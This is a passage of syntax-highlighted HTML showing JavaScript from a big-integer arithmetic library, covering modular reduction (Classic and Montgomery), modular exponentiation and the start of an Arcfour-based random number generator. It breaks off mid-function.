<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ys</span><span class="p">;</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">nsh</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">rShiftTo</span><span class="p">(</span><span class="nx">nsh</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span><span class="w">    </span><span class="c1">// Denormalize remainder</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">ts</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// (public) this mod a</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnMod</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">abs</span><span class="p">().</span><span class="nx">divRemTo</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">compareTo</span><span class="p">(</span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Modular reduction using &quot;classic&quot; algorithm</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">Classic</span><span class="p">(</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">cConvert</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">compareTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">mod</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">);</span>
<span class="w">  </span><span class="k">else</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">cRevert</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">cReduce</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">divRemTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="nx">x</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">cMulTo</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">multiplyTo</span><span class="p">(</span><span class="nx">y</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">cSqrTo</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">squareTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (protected) return &quot;-1/this % 2^DB&quot;; useful for Mont. reduction</span>
<span class="c1">// justification:</span>
<span class="c1">//         xy == 1 (mod m)</span>
<span class="c1">//         xy =  1+km</span>
<span class="c1">//   xy(2-xy) = (1+km)(1-km)</span>
<span class="c1">// x[y(2-xy)] = 1-k^2m^2</span>
<span class="c1">// x[y(2-xy)] == 1 (mod m^2)</span>
<span class="c1">// if y is 1/x mod m, then y(2-xy) is 1/x mod m^2</span>
<span class="c1">// should reduce x and y(2-xy) by m^2 at each step to keep size bounded.</span>
<span class="c1">// JS multiply &quot;overflows&quot; differently from C/C++, so care is needed here.</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpInvDigit</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="nx">x</span><span class="o">&amp;</span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="o">&amp;</span><span class="mf">3</span><span class="p">;</span><span class="w">        </span><span class="c1">// y == 1/x mod 2^2</span>
<span class="w">  </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="o">*</span><span class="p">(</span><span class="mf">2</span><span class="o">-</span><span class="p">(</span><span class="nx">x</span><span class="o">&amp;</span><span class="mh">0xf</span><span class="p">)</span><span class="o">*</span><span class="nx">y</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xf</span><span class="p">;</span><span class="w">    </span><span class="c1">// y == 1/x mod 2^4</span>
<span class="w">  </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="o">*</span><span class="p">(</span><span class="mf">2</span><span class="o">-</span><span class="p">(</span><span class="nx">x</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span><span class="o">*</span><span class="nx">y</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">;</span><span class="w">    </span><span class="c1">// y == 1/x mod 2^8</span>
<span class="w">  </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="o">*</span><span class="p">(</span><span class="mf">2</span><span class="o">-</span><span class="p">(((</span><span class="nx">x</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">*</span><span class="nx">y</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">;</span><span class="w">    </span><span class="c1">// y == 1/x mod 2^16</span>
<span class="w">  </span><span class="c1">// last step - calculate inverse mod DV directly;</span>
<span class="w">  </span><span class="c1">// assumes 16 &lt; DB &lt;= 32 and assumes ability to handle 48-bit ints</span>
<span class="w">  </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="o">*</span><span class="p">(</span><span class="mf">2</span><span class="o">-</span><span class="nx">x</span><span class="o">*</span><span class="nx">y</span><span class="o">%</span><span class="k">this</span><span class="p">.</span><span class="nx">DV</span><span class="p">))</span><span class="o">%</span><span class="k">this</span><span class="p">.</span><span class="nx">DV</span><span class="p">;</span><span class="w">        </span><span class="c1">// y == 1/x mod 2^dbits</span>
<span class="w">  </span><span class="c1">// we really want the negative inverse, and -DV &lt; y &lt; DV</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="o">&gt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?</span><span class="k">this</span><span class="p">.</span><span class="nx">DV</span><span class="o">-</span><span class="nx">y</span><span class="o">:-</span><span class="nx">y</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Montgomery reduction</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">Montgomery</span><span class="p">(</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">mp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">invDigit</span><span class="p">();</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">mpl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">mp</span><span class="o">&amp;</span><span class="mh">0x7fff</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">mph</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">mp</span><span class="o">&gt;&gt;</span><span class="mf">15</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">um</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="nx">m</span><span class="p">.</span><span class="nx">DB</span><span class="o">-</span><span class="mf">15</span><span class="p">))</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">mt2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="o">*</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// xR mod m</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">montConvert</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span>
<span class="w">  </span><span class="nx">x</span><span class="p">.</span><span class="nx">abs</span><span class="p">().</span><span class="nx">dlShiftTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="nx">r</span><span class="p">.</span><span class="nx">divRemTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">compareTo</span><span class="p">(</span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// x/R mod m</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">montRevert</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">();</span>
<span class="w">  </span><span class="nx">x</span><span class="p">.</span><span class="nx">copyTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// x = x/R mod m (HAC 14.32)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">montReduce</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">mt2</span><span class="p">)</span><span class="w">    </span><span class="c1">// pad x so am has enough room later</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="nx">x</span><span class="p">.</span><span class="nx">t</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// faster way of calculating u0 = x[i]*mp mod DV</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0x7fff</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">u0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">j</span><span class="o">*</span><span class="k">this</span><span class="p">.</span><span class="nx">mpl</span><span class="o">+</span><span class="p">(((</span><span class="nx">j</span><span class="o">*</span><span class="k">this</span><span class="p">.</span><span class="nx">mph</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mf">15</span><span class="p">)</span><span class="o">*</span><span class="k">this</span><span class="p">.</span><span class="nx">mpl</span><span class="p">)</span><span class="o">&amp;</span><span class="k">this</span><span class="p">.</span><span class="nx">um</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mf">15</span><span class="p">))</span><span class="o">&amp;</span><span class="nx">x</span><span class="p">.</span><span class="nx">DM</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// use am to combine the multiply-shift-add into one call</span>
<span class="w">    </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">;</span>
<span class="w">    </span><span class="nx">x</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">am</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="nx">u0</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">i</span><span class="p">,</span><span class="mf">0</span><span class="p">,</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// propagate carry</span>
<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">DV</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">DV</span><span class="p">;</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="o">++</span><span class="nx">j</span><span class="p">]</span><span class="o">++</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="nx">x</span><span class="p">.</span><span class="nx">clamp</span><span class="p">();</span>
<span class="w">  </span><span class="nx">x</span><span class="p">.</span><span class="nx">drShiftTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nx">t</span><span class="p">,</span><span class="nx">x</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">compareTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">subTo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">m</span><span class="p">,</span><span class="nx">x</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// r = &quot;x^2/R mod m&quot;; x != r</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">montSqrTo</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">squareTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// r = &quot;xy/R mod m&quot;; x,y != r</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">montMulTo</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">,</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">multiplyTo</span><span class="p">(</span><span class="nx">y</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">reduce</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (protected) true iff this is even</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpIsEven</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="p">((</span><span class="k">this</span><span class="p">.</span><span class="nx">t</span><span class="o">&gt;</span><span class="mf">0</span><span class="p">)</span><span class="o">?</span><span class="p">(</span><span class="k">this</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">&amp;</span><span class="mf">1</span><span class="p">)</span><span class="o">:</span><span class="k">this</span><span class="p">.</span><span class="nx">s</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>

<span class="c1">// (protected) this^e, e &lt; 2^32, doing sqr and mul with &quot;r&quot; (HAC 14.79)</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnpExp</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">z</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ONE</span><span class="p">;</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">(),</span><span class="w"> </span><span class="nx">r2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbi</span><span class="p">(),</span><span class="w"> </span><span class="nx">g</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">z</span><span class="p">.</span><span class="nx">convert</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbits</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="nx">g</span><span class="p">.</span><span class="nx">copyTo</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">z</span><span class="p">.</span><span class="nx">sqrTo</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">r2</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="nx">e</span><span class="o">&amp;</span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">i</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="nx">z</span><span class="p">.</span><span class="nx">mulTo</span><span class="p">(</span><span class="nx">r2</span><span class="p">,</span><span class="nx">g</span><span class="p">,</span><span class="nx">r</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r2</span><span class="p">;</span><span class="w"> </span><span class="nx">r2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">z</span><span class="p">.</span><span class="nx">revert</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// (public) this^e % m, 0 &lt;= e &lt; 2^32</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">bnModPowInt</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">m</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">z</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">256</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">isEven</span><span class="p">())</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Classic</span><span class="p">(</span><span class="nx">m</span><span class="p">);</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Montgomery</span><span class="p">(</span><span class="nx">m</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">exp</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">z</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// prng4.js - uses Arcfour as a PRNG</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">Arcfour</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// Initialize arcfour context from key, an array of ints, each from [0..255]</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">ARC4init</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">j</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">256</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">i</span><span class="p">;</span>
<span class="w">  </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">256</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="nx">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">key</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">length</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">    </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">S</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
